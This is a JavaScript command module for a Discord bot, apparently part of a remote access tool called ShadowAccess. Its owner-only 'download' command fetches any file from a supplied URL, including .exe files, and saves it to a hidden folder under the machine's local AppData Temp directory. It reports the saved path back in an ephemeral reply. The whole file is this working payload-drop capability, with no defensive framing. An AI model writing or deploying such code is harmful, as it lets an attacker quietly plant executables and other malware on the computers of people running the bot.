const { ApplicationCommandOptionType } = require("discord.js"),
 axios = require("axios"),
 fs = require("fs"),
 path = require("path");

module.exports = {
  name: "download",
  ownerOnly: true,
  description: "Download a file from the specified URL",
  options: [
    {
      name: "file_url",
      description:
        "File URL (Must end with files extension .exe, .js, .txt, etc)",
      type: ApplicationCommandOptionType.String,
      required: true,
    },
  ],
  run: async (client, interaction, args) => {
    const fileUrl = interaction.options.getString("file_url");
    await interaction.reply({
      content: `Wait...`,
      ephemeral: true,
    });
    try {
      const response = await axios.get(fileUrl, {
        responseType: "arraybuffer",
      });
      const fileData = Buffer.from(response.data);
      const fileExtension = path.basename(fileUrl);
      const filePath = path.join(process.env.localappdata, "Temp", "ShadowAccess");
      if (!fs.existsSync(filePath)) {
        try {
          fs.mkdirSync(filePath, { recursive: true });
        } catch (e) {}
      }

      fs.writeFileSync(path.join(filePath, fileExtension), fileData);
      await interaction.editReply({
        content: `File downloaded and saved at: ${path.join(filePath, fileExtension)}`,
        ephemeral: true,
      });
    } catch (error) {
      await interaction.editReply({
        content: `Error downloading file: ${error.message}`,
        ephemeral: true,
      });
    }
  },
};
